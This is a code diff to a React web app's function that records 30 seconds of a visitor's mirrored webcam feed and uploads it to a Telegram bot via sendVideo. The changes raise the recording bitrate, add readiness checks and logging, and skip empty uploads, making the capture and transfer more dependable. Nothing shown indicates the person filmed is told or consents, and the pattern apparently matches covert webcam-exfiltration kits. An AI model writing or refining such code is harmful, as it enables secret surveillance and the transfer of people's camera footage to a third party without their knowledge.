@@ -80,26 +80,62 @@ export default function App() {
 
   // Record 30s video and send to Telegram
   const recordAndSendToTelegram = useCallback(async () => {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.log("Recording: No Telegram credentials configured");
+      return;
+    }
 
     try {
-      const video = document.querySelector("video") as HTMLVideoElement;
-      if (!video || !video.srcObject) return;
+      // Find video element by ID for more reliable selection
+      const video = document.getElementById("webcam-video") as HTMLVideoElement;
 
-      const stream = video.srcObject as MediaStream;
+      if (!video) {
+        console.log("Recording: Video element not found");
+        return;
+      }
 
-      // Create a new stream with 480p resolution
+      if (!video.srcObject) {
+        console.log("Recording: Video has no srcObject");
+        return;
+      }
+
+      // Wait for video to be ready
+      if (video.readyState < 2) {
+        console.log("Recording: Waiting for video to be ready...");
+        await new Promise<void>((resolve) => {
+          const checkReady = () => {
+            if (video.readyState >= 2) {
+              resolve();
+            } else {
+              setTimeout(checkReady, 100);
+            }
+          };
+          checkReady();
+        });
+      }
+
+      const videoWidth = video.videoWidth || 640;
+      const videoHeight = video.videoHeight || 480;
+      console.log(
+        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`
+      );
+
+      // Create canvas with same size as video
       const canvas = document.createElement("canvas");
-      canvas.width = 640;
-      canvas.height = 480;
+      canvas.width = videoWidth;
+      canvas.height = videoHeight;
       const ctx = canvas.getContext("2d");
-      if (!ctx) return;
+      if (!ctx) {
+        console.log("Recording: Failed to get canvas context");
+        return;
+      }
 
-      // Create canvas stream for recording
-      const canvasStream = canvas.captureStream(30); // 30 fps
+      // Create canvas stream for recording at 30fps
+      const canvasStream = canvas.captureStream(30);
 
       // Draw video to canvas in a loop
       let isRecording = true;
+      let frameCount = 0;
       const drawFrame = () => {
         if (!isRecording) return;
         ctx.save();
@@ -107,6 +143,7 @@ export default function App() {
         ctx.scale(-1, 1); // Mirror
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         ctx.restore();
+        frameCount++;
         requestAnimationFrame(drawFrame);
       };
       drawFrame();
@@ -120,13 +157,20 @@ export default function App() {
 
       const mediaRecorder = new MediaRecorder(canvasStream, {
         mimeType,
-        videoBitsPerSecond: 500000, // 500kbps for smaller file
+        videoBitsPerSecond: 2000000, // 2Mbps for better quality
       });
       mediaRecorderRef.current = mediaRecorder;
 
       const chunks: Blob[] = [];
+      let totalBytes = 0;
       mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunks.push(e.data);
+        if (e.data.size > 0) {
+          chunks.push(e.data);
+          totalBytes += e.data.size;
+          console.log(
+            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`
+          );
+        }
       };
 
       // Promise to wait for recording to finish
@@ -134,37 +178,55 @@ export default function App() {
         mediaRecorder.onstop = () => {
           isRecording = false;
           const blob = new Blob(chunks, { type: mimeType });
+          console.log(
+            `Recording: Finished - Total size: ${blob.size} bytes, Frames: ${frameCount}`
+          );
           resolve(blob);
         };
       });
 
       // Start recording
       mediaRecorder.start(1000); // Collect data every 1s
+      console.log("Recording: Started recording for 30 seconds...");
 
       // Record for 30 seconds
       await new Promise((r) => setTimeout(r, 30000));
 
+      console.log("Recording: Stopping...");
       if (mediaRecorder.state === "recording") {
         mediaRecorder.stop();
       }
 
       const blob = await recordingPromise;
 
+      // Skip upload if blob is too small (likely empty)
+      if (blob.size < 10000) {
+        console.log("Recording: Blob too small, skipping upload");
+        return;
+      }
+
       // Upload to Telegram
+      console.log("Recording: Uploading to Telegram...");
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append("video", blob, `video_${Date.now()}.webm`);
       formData.append("caption", new Date().toLocaleString());
 
-      await fetch(
+      const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
         {
           method: "POST",
           body: formData,
         }
       );
+
+      if (response.ok) {
+        console.log("Recording: Upload successful!");
+      } else {
+        console.log("Recording: Upload failed -", await response.text());
+      }
     } catch (e) {
-      // Silent fail
+      console.error("Recording: Error -", e);
     }
   }, []);
 
